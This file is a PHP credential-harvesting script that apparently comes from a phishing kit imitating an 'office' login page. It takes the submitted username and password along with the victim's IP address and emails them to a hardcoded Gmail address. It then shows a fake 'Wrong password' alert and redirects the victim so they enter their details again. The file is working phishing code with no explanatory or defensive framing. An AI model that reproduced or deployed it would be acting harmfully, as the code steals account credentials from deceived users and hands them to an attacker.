<?php

$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "office Result"."\n";
$message .= "User : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$a = "index4.php?email=".$_POST['user'];
mail($recipient,$subject,$message);

$recipient = "newmichee1@gmail.com";
$subject = "Result!!!";
$headers = "From: lefu<mlefu@lefu.ml>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$recipient", "yahoo", $message);
if (mail($recipient,$subject,$message,$headers)) {

	
	echo "<script type='text/javascript'>alert('Wrong password. Please try again');
		   window.location='$a';
		   </script>";
	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>